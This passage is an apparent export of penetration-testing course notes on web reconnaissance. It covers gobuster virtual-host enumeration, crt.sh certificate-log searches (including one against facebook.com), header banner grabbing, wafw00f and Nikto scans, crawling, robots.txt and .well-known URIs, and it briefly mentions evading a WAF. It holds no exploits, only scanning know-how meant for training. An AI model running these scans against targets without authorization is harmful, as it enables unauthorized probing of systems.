<wordlist_file> --append-domain\n```\n\n- The `-u` flag specifies the target URL (replace `<target_IP_address>` with the actual IP).\n- The `-w` flag specifies the wordlist file (replace `<wordlist_file>` with the path to your wordlist).\n- The `--append-domain` flag appends the base domain to each word in the wordlist.\n\nIn newer versions of Gobuster, the --append-domain flag is required to append the base domain to each word in the wordlist when performing virtual host discovery. This flag ensures that Gobuster correctly constructs the full virtual hostnames, which is essential for the accurate enumeration of potential subdomains. In older versions of Gobuster, this functionality was handled differently, and the --append-domain flag was not necessary. Users of older versions might not find this flag available or needed, as the tool appended the base domain by default or employed a different mechanism for virtual host generation.\n\n`Gobuster` will output potential virtual hosts as it discovers them. Analyse the results carefully, noting any unusual or interesting findings. Further investigation might be needed to confirm the existence and functionality of the discovered virtual hosts.\n\nThere are a couple of other arguments that are worth knowing:\n\n- Consider using the `-t` flag to increase the number of threads for faster scanning.\n- The `-k` flag can ignore SSL/TLS certificate errors.\n- You can use the `-o` flag to save the output to a file for later analysis.\n\nVirtual Hosts\n\n```shell-session\ndrxh3kr@htb[/htb]$ gobuster vhost -u http://inlanefreight.htb:81 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://inlanefreight.htb:81\n[+] Method:          GET\n[+] Threads:         10\n[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:      gobuster/3.6\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\nStarting gobuster in VHOST enumeration mode\n===============================================================\nFound: forum.inlanefreight.htb:81 Status: 200 [Size: 100]\n[...]\nProgress: 114441 / 114442 (100.00%)\n===============================================================\nFinished\n===============================================================\n```\n\nVirtual host discovery can generate significant traffic and might be detected by intrusion detection systems (IDS) or web application firewalls (WAF). Exercise caution and obtain proper authorization before scanning any targets.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/11-Certificate Transparency Logs",
    "path": "02_CPTS/04-Information Gathering - Web Edition/11-Certificate Transparency Logs.md",
    "title": "11 Certificate Transparency Logs",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "In the sprawling mass of the internet, trust is a fragile commodity. One of the cornerstones of this trust is the Secure Sockets Layer/Transport Layer Security (SSL/TLS) protocol, which encrypts commu...",
    "category": "02_CPTS",
    "content": "In the sprawling mass of the internet, trust is a fragile commodity. One of the cornerstones of this trust is the `Secure Sockets Layer/Transport Layer Security` (`SSL/TLS`) protocol, which encrypts communication between your browser and a website. At the heart of SSL/TLS lies the `digital certificate`, a small file that verifies a website's identity and allows for secure, encrypted communication.\n\nHowever, the process of issuing and managing these certificates isn't foolproof. Attackers can exploit rogue or mis-issued certificates to impersonate legitimate websites, intercept sensitive data, or spread malware. This is where Certificate Transparency (CT) logs come into play.\n\n## What are Certificate Transparency Logs?\n\n`Certificate Transparency` (`CT`) logs are public, append-only ledgers that record the issuance of SSL/TLS certificates. Whenever a Certificate Authority (CA) issues a new certificate, it must submit it to multiple CT logs. Independent organisations maintain these logs and are open for anyone to inspect.\n\nThink of CT logs as a `global registry of certificates`. They provide a transparent and verifiable record of every SSL/TLS certificate issued for a website. This transparency serves several crucial purposes:\n\n- `Early Detection of Rogue Certificates`: By monitoring CT logs, security researchers and website owners can quickly identify suspicious or misissued certificates. A rogue certificate is an unauthorized or fraudulent digital certificate issued by a trusted certificate authority. Detecting these early allows for swift action to revoke the certificates before they can be used for malicious purposes.\n- `Accountability for Certificate Authorities`: CT logs hold CAs accountable for their issuance practices. If a CA issues a certificate that violates the rules or standards, it will be publicly visible in the logs, leading to potential sanctions or loss of trust.\n- `Strengthening the Web PKI (Public Key Infrastructure)`: The Web PKI is the trust system underpinning secure online communication. CT logs help to enhance the security and integrity of the Web PKI by providing a mechanism for public oversight and verification of certificates.\n\nClick to expand a technical breakdown of how CT Logs Work\n\n![](https://academy.hackthebox.com/storage/modules/144/diagram-001.png)\n\n  \n\n## CT Logs and Web Recon\n\nCertificate Transparency logs offer a unique advantage in subdomain enumeration compared to other methods. Unlike brute-forcing or wordlist-based approaches, which rely on guessing or predicting subdomain names, CT logs provide a definitive record of certificates issued for a domain and its subdomains. This means you're not limited by the scope of your wordlist or the effectiveness of your brute-forcing algorithm. Instead, you gain access to a historical and comprehensive view of a domain's subdomains, including those that might not be actively used or easily guessable.\n\nFurthermore, CT logs can unveil subdomains associated with old or expired certificates. These subdomains might host outdated software or configurations, making them potentially vulnerable to exploitation.\n\nIn essence, CT logs provide a reliable and efficient way to discover subdomains without the need for exhaustive brute-forcing or relying on the completeness of wordlists. They offer a unique window into a domain's history and can reveal subdomains that might otherwise remain hidden, significantly enhancing your reconnaissance capabilities.\n\n## Searching CT Logs\n\nThere are two popular options for searching CT logs:\n\n|Tool|Key Features|Use Cases|Pros|Cons|\n|---|---|---|---|---|\n|[crt.sh](https://crt.sh/)|User-friendly web interface, simple search by domain, displays certificate details, SAN entries.|Quick and easy searches, identifying subdomains, checking certificate issuance history.|Free, easy to use, no registration required.|Limited filtering and analysis options.|\n|[Censys](https://search.censys.io/)|Powerful search engine for internet-connected devices, advanced filtering by domain, IP, certificate attributes.|In-depth analysis of certificates, identifying misconfigurations, finding related certificates and hosts.|Extensive data and filtering options, API access.|Requires registration (free tier available).|\n\n### crt.sh lookup\n\nWhile `crt.sh` offers a convenient web interface, you can also leverage its API for automated searches directly from your terminal. Let's see how to find all 'dev' subdomains on `facebook.com` using `curl` and `jq`:\n\nCertificate Transparency Logs\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -s \"https://crt.sh/?q=facebook.com&output=json\" | jq -r '.[]\n | select(.name_value | contains(\"dev\")) | .name_value' | sort -u\n \n*.dev.facebook.com\n*.newdev.facebook.com\n*.secure.dev.facebook.com\ndev.facebook.com\ndevvm1958.ftw3.facebook.com\nfacebook-amex-dev.facebook.com\nfacebook-amex-sign-enc-dev.facebook.com\nnewdev.facebook.com\nsecure.dev.facebook.com\n```\n\n- `curl -s \"https://crt.sh/?q=facebook.com&output=json\"`: This command fetches the JSON output from crt.sh for certificates matching the domain `facebook.com`.\n- `jq -r '.[] | select(.name_value | contains(\"dev\")) | .name_value'`: This part filters the JSON results, selecting only entries where the `name_value` field (which contains the domain or subdomain) includes the string \"`dev`\". The `-r` flag tells `jq` to output raw strings.\n- `sort -u`: This sorts the results alphabetically and removes duplicates.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/12- Fingerprinting Web",
    "path": "02_CPTS/04-Information Gathering - Web Edition/12- Fingerprinting Web.md",
    "title": "12  Fingerprinting Web",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Fingerprinting focuses on extracting technical details about the technologies powering a website or web application. Similar to how a fingerprint uniquely identifies a person, the digital signatures o...",
    "category": "02_CPTS",
    "content": "Fingerprinting focuses on extracting technical details about the technologies powering a website or web application. Similar to how a fingerprint uniquely identifies a person, the digital signatures of web servers, operating systems, and software components can reveal critical information about a target's infrastructure and potential security weaknesses. This knowledge empowers attackers to tailor attacks and exploit vulnerabilities specific to the identified technologies.\n\nFingerprinting serves as a cornerstone of web reconnaissance for several reasons:\n\n- `Targeted Attacks`: By knowing the specific technologies in use, attackers can focus their efforts on exploits and vulnerabilities that are known to affect those systems. This significantly increases the chances of a successful compromise.\n- `Identifying Misconfigurations`: Fingerprinting can expose misconfigured or outdated software, default settings, or other weaknesses that might not be apparent through other reconnaissance methods.\n- `Prioritising Targets`: When faced with multiple potential targets, fingerprinting helps prioritise efforts by identifying systems more likely to be vulnerable or hold valuable information.\n- `Building a Comprehensive Profile`: Combining fingerprint data with other reconnaissance findings creates a holistic view of the target's infrastructure, aiding in understanding its overall security posture and potential attack vectors.\n\n## Fingerprinting Techniques\n\nThere are several techniques used for web server and technology fingerprinting:\n\n- `Banner Grabbing`: Banner grabbing involves analysing the banners presented by web servers and other services. These banners often reveal the server software, version numbers, and other details.\n- `Analysing HTTP Headers`: HTTP headers transmitted with every web page request and response contain a wealth of information. The `Server` header typically discloses the web server software, while the `X-Powered-By` header might reveal additional technologies like scripting languages or frameworks.\n- `Probing for Specific Responses`: Sending specially crafted requests to the target can elicit unique responses that reveal specific technologies or versions. For example, certain error messages or behaviours are characteristic of particular web servers or software components.\n- `Analysing Page Content`: A web page's content, including its structure, scripts, and other elements, can often provide clues about the underlying technologies. There may be a copyright header that indicates specific software being used, for example.\n\nA variety of tools exist that automate the fingerprinting process, combining various techniques to identify web servers, operating systems, content management systems, and other technologies:\n\n|Tool|Description|Features|\n|---|---|---|\n|`Wappalyzer`|Browser extension and online service for website technology profiling.|Identifies a wide range of web technologies, including CMSs, frameworks, analytics tools, and more.|\n|`BuiltWith`|Web technology profiler that provides detailed reports on a website's technology stack.|Offers both free and paid plans with varying levels of detail.|\n|`WhatWeb`|Command-line tool for website fingerprinting.|Uses a vast database of signatures to identify various web technologies.|\n|`Nmap`|Versatile network scanner that can be used for various reconnaissance tasks, including service and OS fingerprinting.|Can be used with scripts (NSE) to perform more specialised fingerprinting.|\n|`Netcraft`|Offers a range of web security services, including website fingerprinting and security reporting.|Provides detailed reports on a website's technology, hosting provider, and security posture.|\n|`wafw00f`|Command-line tool specifically designed for identifying Web Application Firewalls (WAFs).|Helps determine if a WAF is present and, if so, its type and configuration.|\n\n## Fingerprinting inlanefreight.com\n\nLet's apply our fingerprinting knowledge to uncover the digital DNA of our purpose-built host, `inlanefreight.com`. We'll leverage both manual and automated techniques to gather information about its web server, technologies, and potential vulnerabilities.\n\n### Banner Grabbing\n\nOur first step is to gather information directly from the web server itself. We can do this using the `curl` command with the `-I` flag (or `--head`) to fetch only the HTTP headers, not the entire page content.\n\nFingerprinting\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -I inlanefreight.com\n```\n\nThe output will include the server banner, revealing the web server software and version number:\n\nFingerprinting\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -I inlanefreight.com\n\nHTTP/1.1 301 Moved Permanently\nDate: Fri, 31 May 2024 12:07:44 GMT\nServer: Apache/2.4.41 (Ubuntu)\nLocation: https://inlanefreight.com/\nContent-Type: text/html; charset=iso-8859-1\n```\n\nIn this case, we see that `inlanefreight.com` is running on `Apache/2.4.41`, specifically the `Ubuntu` version. This information is our first clue, hinting at the underlying technology stack. It's also trying to redirect to `https://inlanefreight.com/` so grab those banners too\n\nFingerprinting\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -I https://inlanefreight.com\n\nHTTP/1.1 301 Moved Permanently\nDate: Fri, 31 May 2024 12:12:12 GMT\nServer: Apache/2.4.41 (Ubuntu)\nX-Redirect-By: WordPress\nLocation: https://www.inlanefreight.com/\nContent-Type: text/html; charset=UTF-8\n```\n\nWe now get a really interesting header, the server is trying to redirect us again, but this time we see that it's `WordPress` that is doing the redirection to `https://www.inlanefreight.com/`\n\nFingerprinting\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -I https://www.inlanefreight.com\n\nHTTP/1.1 200 OK\nDate: Fri, 31 May 2024 12:12:26 GMT\nServer: Apache/2.4.41 (Ubuntu)\nLink: <https://www.inlanefreight.com/index.php/wp-json/>; rel=\"https://api.w.org/\"\nLink: <https://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7>; rel=\"alternate\"; type=\"application/json\"\nLink: <https://www.inlanefreight.com/>; rel=shortlink\nContent-Type: text/html; charset=UTF-8\n```\n\nA few more interesting headers, including an interesting path that contains `wp-json`. The `wp-` prefix is common to WordPress.\n\n### Wafw00f\n\n`Web Application Firewalls` (`WAFs`) are security solutions designed to protect web applications from various attacks. Before proceeding with further fingerprinting, it's crucial to determine if `inlanefreight.com` employs a WAF, as it could interfere with our probes or potentially block our requests.\n\nTo detect the presence of a WAF, we'll use the `wafw00f` tool. To install `wafw00f`, you can use pip3:\n\nFingerprinting\n\n```shell-session\ndrxh3kr@htb[/htb]$ pip3 install git+https://github.com/EnableSecurity/wafw00f\n```\n\nOnce it's installed, pass the domain you want to check as an argument to the tool:\n\nFingerprinting\n\n```shell-session\ndrxh3kr@htb[/htb]$ wafw00f inlanefreight.com\n\n                ______\n               /      \\\n              (  W00f! )\n               \\  ____/\n               ,,    __            404 Hack Not Found\n           |`-.__   / /                      __     __\n           /\"  _/  /_/                       \\ \\   / /\n          *===*    /                          \\ \\_/ /  405 Not Allowed\n         /     )__//                           \\   /\n    /|  /     /---`                        403 Forbidden\n    \\\\/`   \\ |                                 / _ \\\n    `\\    /_\\\\_              502 Bad Gateway  / / \\ \\  500 Internal Error\n      `_____``-`                             /_/   \\_\\\n\n                        ~ WAFW00F : v2.2.0 ~\n        The Web Application Firewall Fingerprinting Toolkit\n    \n[*] Checking https://inlanefreight.com\n[+] The site https://inlanefreight.com is behind Wordfence (Defiant) WAF.\n[~] Number of requests: 2\n```\n\nThe `wafw00f` scan on `inlanefreight.com` reveals that the website is protected by the `Wordfence Web Application Firewall` (`WAF`), developed by Defiant.\n\nThis means the site has an additional security layer that could block or filter our reconnaissance attempts. In a real-world scenario, it would be crucial to keep this in mind as you proceed with further investigation, as you might need to adapt techniques to bypass or evade the WAF's detection mechanisms.\n\n### Nikto\n\n`Nikto` is a powerful open-source web server scanner. In addition to its primary function as a vulnerability assessment tool, `Nikto's` fingerprinting capabilities provide insights into a website's technology stack.\n\n`Nikto` is pre-installed on pwnbox, but if you need to install it, you can run the following commands:\n\nFingerprinting\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo apt update && sudo apt install -y perl\ndrxh3kr@htb[/htb]$ git clone https://github.com/sullo/nikto\ndrxh3kr@htb[/htb]$ cd nikto/program\ndrxh3kr@htb[/htb]$ chmod +x ./nikto.pl\n```\n\nTo scan `inlanefreight.com` using `Nikto`, only running the fingerprinting modules, execute the following command:\n\nFingerprinting\n\n```shell-session\ndrxh3kr@htb[/htb]$ nikto -h inlanefreight.com -Tuning b\n```\n\nThe `-h` flag specifies the target host. The `-Tuning b` flag tells `Nikto` to only run the Software Identification modules.\n\n`Nikto` will then initiate a series of tests, attempting to identify outdated software, insecure files or configurations, and other potential security risks.\n\nFingerprinting\n\n```shell-session\ndrxh3kr@htb[/htb]$ nikto -h inlanefreight.com -Tuning b\n\n- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Multiple IPs found: 134.209.24.248, 2a03:b0c0:1:e0::32c:b001\n+ Target IP:          134.209.24.248\n+ Target Hostname:    www.inlanefreight.com\n+ Target Port:        443\n---------------------------------------------------------------------------\n+ SSL Info:        Subject:  /CN=inlanefreight.com\n                   Altnames: inlanefreight.com, www.inlanefreight.com\n                   Ciphers:  TLS_AES_256_GCM_SHA384\n                   Issuer:   /C=US/O=Let's Encrypt/CN=R3\n+ Start Time:         2024-05-31 13:35:54 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.4.41 (Ubuntu)\n+ /: Link header found with value: ARRAY(0x558e78790248). See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Link\n+ /: The site uses TLS and the Strict-Transport-Security HTTP header is not defined. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ /index.php?: Uncommon header 'x-redirect-by' found, with contents: WordPress.\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ /: The Content-Encoding header is set to \"deflate\" which may mean that the server is vulnerable to the BREACH attack. See: http://breachattack.com/\n+ Apache/2.4.41 appears to be outdated (current is at least 2.4.59). Apache 2.2.34 is the EOL for the 2.x branch.\n+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.\n+ /license.txt: License file found may identify site software.\n+ /: A Wordpress installation was found.\n+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies\n+ /wp-login.php:X-Frame-Options header is deprecated and has been replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive instead. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /wp-login.php: Wordpress login found.\n+ 1316 requests: 0 error(s) and 12 item(s) reported on remote host\n+ End Time:           2024-05-31 13:47:27 (GMT0) (693 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n```\n\nThe reconnaissance scan on `inlanefreight.com` reveals several key findings:\n\n- `IPs`: The website resolves to both IPv4 (`134.209.24.248`) and IPv6 (`2a03:b0c0:1:e0::32c:b001`) addresses.\n- `Server Technology`: The website runs on `Apache/2.4.41 (Ubuntu)`\n- `WordPress Presence`: The scan identified a WordPress installation, including the login page (`/wp-login.php`). This suggests the site might be a potential target for common WordPress-related exploits.\n- `Information Disclosure`: The presence of a `license.txt` file could reveal additional details about the website's software components.\n- `Headers`: Several non-standard or insecure headers were found, including a missing `Strict-Transport-Security` header and a potentially insecure `x-redirect-by` header.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/13-Crawling",
    "path": "02_CPTS/04-Information Gathering - Web Edition/13-Crawling.md",
    "title": "13 Crawling",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Crawling, often called spidering, is the automated process of systematically browsing the World Wide Web. Similar to how a spider navigates its web, a web crawler follows links from one page to anothe...",
    "category": "02_CPTS",
    "content": "`Crawling`, often called `spidering`, is the `automated process of systematically browsing the World Wide Web`. Similar to how a spider navigates its web, a web crawler follows links from one page to another, collecting information. These crawlers are essentially bots that use pre-defined algorithms to discover and index web pages, making them accessible through search engines or for other purposes like data analysis and web reconnaissance.\n\n## How Web Crawlers Work\n\nThe basic operation of a web crawler is straightforward yet powerful. It starts with a seed URL, which is the initial web page to crawl. The crawler fetches this page, parses its content, and extracts all its links. It then adds these links to a queue and crawls them, repeating the process iteratively. Depending on its scope and configuration, the crawler can explore an entire website or even a vast portion of the web.\n\n1. `Homepage`: You start with the homepage containing `link1`, `link2`, and `link3`.\n    \n    Code: txt\n    \n    ```txt\n    Homepage\n    ├── link1\n    ├── link2\n    └── link3\n    ```\n    \n2. `Visiting link1`: Visiting `link1` shows the homepage, `link2`, and also `link4` and `link5`.\n    \n    Code: txt\n    \n    ```txt\n    link1 Page\n    ├── Homepage\n    ├── link2\n    ├── link4\n    └── link5\n    ```\n    \n3. `Continuing the Crawl`: The crawler continues to follow these links systematically, gathering all accessible pages and their links.\n    \n\nThis example illustrates how a web crawler discovers and collects information by systematically following links, distinguishing it from fuzzing which involves guessing potential links.\n\nThere are two primary types of crawling strategies.\n\n### Breadth-First Crawling\n\n![Flowchart showing a Seed URL leading to Page 1, which branches to Page 2 and Page 3. Page 2 connects to Page 4 and Page 5, while Page 3 connects to Page 6 and Page 7.](https://mermaid.ink/svg/pako:eNo90D0PgjAQBuC_0twsg98Jgwkf6oKJgThZhkpPIEohpR0M4b970shNd09uuHsHKFqJ4EOpRVexJOWqtw83ZIiS3dKEK0YV3K-iRLbMuUIluQqY5x1Y6HSV_yFysCYIJ4gdbGY4OtgSRBOcHOxmODvYE8ACGtSNqCXdOPwu4WAqbJCDT60U-sWBq5H2hDVt9lEF-EZbXIBubVmB_xTvnibbSWEwrgX91syKsjatvrgIpiTGL-8RVcQ)\n\n`Breadth-first crawling` prioritizes exploring a website's width before going deep. It starts by crawling all the links on the seed page, then moves on to the links on those pages, and so on. This is useful for getting a broad overview of a website's structure and content.\n\n### Depth-First Crawling\n\n![Flowchart showing a Seed URL leading to Page 1, then to Page 2. Page 2 connects to Page 3, which branches to Page 4 and Page 5.](https://mermaid.ink/svg/pako:eNo9zz0PgjAQBuC_0twsg18LgwlfGyYG4uQ5VHoC0RZS2sEQ_rsnTezU98mlvXeGZlAEMbRWjp0oKzSTf4RQEylxrUo0gk9yu8iWxPaOhoxCk4goOok06I41XSELsGfIVsgDHBjyFYoAR4YivCEEGtiAJqtlr3iZ-fclgutIE0LMVyXtCwHNwnPSu6H-mAZiZz1twA6-7SB-yvfEyY9KOsp7ySX0X0n1brDn0HWtvHwB2SFOww)\n\nIn contrast, `depth-first crawling` prioritizes depth over breadth. It follows a single path of links as far as possible before backtracking and exploring other paths. This can be useful for finding specific content or reaching deep into a website's structure.\n\nThe choice of strategy depends on the specific goals of the crawling process.\n\n## Extracting Valuable Information\n\nCrawlers can extract a diverse array of data, each serving a specific purpose in the reconnaissance process:\n\n- `Links (Internal and External)`: These are the fundamental building blocks of the web, connecting pages within a website (`internal links`) and to other websites (`external links`). Crawlers meticulously collect these links, allowing you to map out a website's structure, discover hidden pages, and identify relationships with external resources.\n- `Comments`: Comments sections on blogs, forums, or other interactive pages can be a goldmine of information. Users often inadvertently reveal sensitive details, internal processes, or hints of vulnerabilities in their comments.\n- `Metadata`: Metadata refers to `data about data`. In the context of web pages, it includes information like page titles, descriptions, keywords, author names, and dates. This metadata can provide valuable context about a page's content, purpose, and relevance to your reconnaissance goals.\n- `Sensitive Files`: Web crawlers can be configured to actively search for sensitive files that might be inadvertently exposed on a website. This includes `backup files` (e.g., `.bak`, `.old`), `configuration files` (e.g., `web.config`, `settings.php`), `log files` (e.g., `error_log`, `access_log`), and other files containing passwords, `API keys`, or other confidential information. Carefully examining the extracted files, especially backup and configuration files, can reveal a trove of sensitive information, such as `database credentials`, `encryption keys`, or even source code snippets.\n\n### The Importance of Context\n\nUnderstanding the context surrounding the extracted data is paramount.\n\nA single piece of information, like a comment mentioning a specific software version, might not seem significant on its own. However, when combined with other findings—such as an outdated version listed in metadata or a potentially vulnerable configuration file discovered through crawling—it can transform into a critical indicator of a potential vulnerability.\n\nThe true value of extracted data lies in connecting the dots and constructing a comprehensive picture of the target's digital landscape.\n\nFor instance, a list of extracted links might initially appear mundane. But upon closer examination, you notice a pattern: several URLs point to a directory named `/files/`. This triggers your curiosity, and you decide to manually visit the directory. To your surprise, you find that directory browsing is enabled, exposing a host of files, including backup archives, internal documents, and potentially sensitive data. This discovery wouldn't have been possible by merely looking at individual links in isolation; the contextual analysis led you to this critical finding.\n\nSimilarly, seemingly innocuous comments can gain significance when correlated with other discoveries. A comment mentioning a \"file server\" might not raise any red flags initially. However, when combined with the aforementioned discovery of the `/files/` directory, it reinforces the possibility that the file server is publicly accessible, potentially exposing sensitive information or confidential data.\n\nTherefore, it's essential to approach data analysis holistically, considering the relationships between different data points and their potential implications for your reconnaissance goals.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/14-robots.txt",
    "path": "02_CPTS/04-Information Gathering - Web Edition/14-robots.txt.md",
    "title": "14 Robots.Txt",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Imagine you're a guest at a grand house party. While you're free to mingle and explore, there might be certain rooms marked \"Private\" that you're expected to avoid. This is akin to how robots.txt func...",
    "category": "02_CPTS",
    "content": "Imagine you're a guest at a grand house party. While you're free to mingle and explore, there might be certain rooms marked \"Private\" that you're expected to avoid. This is akin to how `robots.txt` functions in the world of web crawling. It acts as a virtual \"`etiquette guide`\" for bots, outlining which areas of a website they are allowed to access and which are off-limits.\n\n## What is robots.txt?\n\nTechnically, `robots.txt` is a simple text file placed in the root directory of a website (e.g., `www.example.com/robots.txt`). It adheres to the Robots Exclusion Standard, guidelines for how web crawlers should behave when visiting a website. This file contains instructions in the form of \"directives\" that tell bots which parts of the website they can and cannot crawl.\n\n### How robots.txt Works\n\nThe directives in robots.txt typically target specific user-agents, which are identifiers for different types of bots. For example, a directive might look like this:\n\nCode: txt\n\n```txt\nUser-agent: *\nDisallow: /private/\n```\n\nThis directive tells all user-agents (`*` is a wildcard) that they are not allowed to access any URLs that start with `/private/`. Other directives can allow access to specific directories or files, set crawl delays to avoid overloading a server or provide links to sitemaps for efficient crawling.\n\n### Understanding robots.txt Structure\n\nThe robots.txt file is a plain text document that lives in the root directory of a website. It follows a straightforward structure, with each set of instructions, or \"record,\" separated by a blank line. Each record consists of two main components:\n\n1. `User-agent`: This line specifies which crawler or bot the following rules apply to. A wildcard (`*`) indicates that the rules apply to all bots. Specific user agents can also be targeted, such as \"Googlebot\" (Google's crawler) or \"Bingbot\" (Microsoft's crawler).\n2. `Directives`: These lines provide specific instructions to the identified user-agent.\n\nCommon directives include:\n\n|Directive|Description|Example|\n|---|---|---|\n|`Disallow`|Specifies paths or patterns that the bot should not crawl.|`Disallow: /admin/` (disallow access to the admin directory)|\n|`Allow`|Explicitly permits the bot to crawl specific paths or patterns, even if they fall under a broader `Disallow` rule.|`Allow: /public/` (allow access to the public directory)|\n|`Crawl-delay`|Sets a delay (in seconds) between successive requests from the bot to avoid overloading the server.|`Crawl-delay: 10` (10-second delay between requests)|\n|`Sitemap`|Provides the URL to an XML sitemap for more efficient crawling.|`Sitemap: https://www.example.com/sitemap.xml`|\n\n### Why Respect robots.txt?\n\nWhile robots.txt is not strictly enforceable (a rogue bot could still ignore it), most legitimate web crawlers and search engine bots will respect its directives. This is important for several reasons:\n\n- `Avoiding Overburdening Servers`: By limiting crawler access to certain areas, website owners can prevent excessive traffic that could slow down or even crash their servers.\n- `Protecting Sensitive Information`: Robots.txt can shield private or confidential information from being indexed by search engines.\n- `Legal and Ethical Compliance`: In some cases, ignoring robots.txt directives could be considered a violation of a website's terms of service or even a legal issue, especially if it involves accessing copyrighted or private data.\n\n## robots.txt in Web Reconnaissance\n\nFor web reconnaissance, robots.txt serves as a valuable source of intelligence. While respecting the directives outlined in this file, security professionals can glean crucial insights into the structure and potential vulnerabilities of a target website:\n\n- `Uncovering Hidden Directories`: Disallowed paths in robots.txt often point to directories or files the website owner intentionally wants to keep out of reach from search engine crawlers. These hidden areas might house sensitive information, backup files, administrative panels, or other resources that could interest an attacker.\n- `Mapping Website Structure`: By analyzing the allowed and disallowed paths, security professionals can create a rudimentary map of the website's structure. This can reveal sections that are not linked from the main navigation, potentially leading to undiscovered pages or functionalities.\n- `Detecting Crawler Traps`: Some websites intentionally include \"honeypot\" directories in robots.txt to lure malicious bots. Identifying such traps can provide insights into the target's security awareness and defensive measures.\n\n### Analyzing robots.txt\n\nHere's an example of a robots.txt file:\n\nCode: txt\n\n```txt\nUser-agent: *\nDisallow: /admin/\nDisallow: /private/\nAllow: /public/\n\nUser-agent: Googlebot\nCrawl-delay: 10\n\nSitemap: https://www.example.com/sitemap.xml\n```\n\nThis file contains the following directives:\n\n- All user agents are disallowed from accessing the `/admin/` and `/private/` directories.\n- All user agents are allowed to access the `/public/` directory.\n- The `Googlebot` (Google's web crawler) is specifically instructed to wait 10 seconds between requests.\n- The sitemap, located at `https://www.example.com/sitemap.xml`, is provided for easier crawling and indexing.\n\nBy analyzing this robots.txt, we can infer that the website likely has an admin panel located at `/admin/` and some private content in the `/private/` directory.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/15-Well-Known URIs",
    "path": "02_CPTS/04-Information Gathering - Web Edition/15-Well-Known URIs.md",
    "title": "15 Well Known URIs",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The .well-known standard, defined in RFC 8615, serves as a standardized directory within a website's root domain. This designated location, typically accessible via the /.well-known/ path on a web ser...",
    "category": "02_CPTS",
    "content": "The `.well-known` standard, defined in [RFC 8615](https://datatracker.ietf.org/doc/html/rfc8615), serves as a standardized directory within a website's root domain. This designated location, typically accessible via the `/.well-known/` path on a web server, centralizes a website's critical metadata, including configuration files and information related to its services, protocols, and security mechanisms.\n\nBy establishing a consistent location for such data, `.well-known` simplifies the discovery and access process for various stakeholders, including web browsers, applications, and security tools. This streamlined approach enables clients to automatically locate and retrieve specific configuration files by constructing the appropriate URL. For instance, to access a website's security policy, a client would request `https://example.com/.well-known/security.txt`.\n\nThe `Internet Assigned Numbers Authority` (`IANA`) maintains a [registry](https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml) of `.well-known` URIs, each serving a specific purpose defined by various specifications and standards. Below is a table highlighting a few notable examples:\n\n|URI Suffix|Description|Status|Reference|\n|---|---|---|---|\n|`security.txt`|Contains contact information for security researchers to report vulnerabilities.|Permanent|RFC 9116|\n|`/.well-known/change-password`|Provides a standard URL for directing users to a password change page.|Provisional|https://w3c.github.io/webappsec-change-password-url/#the-change-password-well-known-uri|\n|`openid-configuration`|Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol.|Permanent|http://openid.net/specs/openid-connect-discovery-1_0.html|\n|`assetlinks.json`|Used for verifying ownership of digital assets (e.g., apps) associated with a domain.|Permanent|https://github.com/google/digitalassetlinks/blob/master/well-known/specification.md|\n|`mta-sts.txt`|Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.|Permanent|RFC 8461|\n\nThis is just a small sample of the many `.well-known` URIs registered with IANA. Each entry in the registry offers specific guidelines and requirements for implementation, ensuring a standardized approach to leveraging the `.well-known` mechanism for various applications.\n\n## Web Recon and .well-known\n\nIn web recon, the `.well-known` URIs can be invaluable for discovering endpoints and configuration details that can be further tested during a penetration test. One particularly useful URI is `openid-configuration`.\n\nThe `openid-configuration` URI is part of the OpenID Connect Discovery protocol, an identity layer built on top of the OAuth 2.0 protocol. When a client application wants to use OpenID Connect for authentication, it can retrieve the OpenID Connect Provider's configuration by accessing the `https://example.com/.well-known/openid-configuration` endpoint. This endpoint returns a JSON document containing metadata about the provider's endpoints, supported authentication methods, token issuance, and more:\n\nCode: json\n\n```json\n{\n  \"issuer\": \"https://example.com\",\n  \"authorization_endpoint\": \"https://example.com/oauth2/authorize\",\n  \"token_endpoint\": \"https://example.com/oauth2/token\",\n  \"userinfo_endpoint\": \"https://example.com/oauth2/userinfo\",\n  